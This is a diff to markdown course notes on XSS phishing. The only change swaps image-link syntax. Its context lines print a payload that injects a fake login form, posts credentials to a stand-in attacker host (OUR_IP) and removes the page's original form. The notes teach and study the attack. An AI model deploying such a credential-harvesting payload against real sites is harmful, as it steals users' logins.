@@ -136,7 +136,7 @@ To write HTML code to the vulnerable page, we can use the JavaScript function `
 document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
 ```
 
-![[Pasted image 20250912145711.png]]
+![](images/Pasted%20image%2020250912145711.png)
 
 We can use `remove()` function to remove the original URL form:
 
@@ -148,7 +148,7 @@ document.getElementById('urlform').remove();
 document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
 ```
 
-![[Pasted image 20250912145811.png]]
+![](images/Pasted%20image%2020250912145811.png)
 
 We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:
 ```html
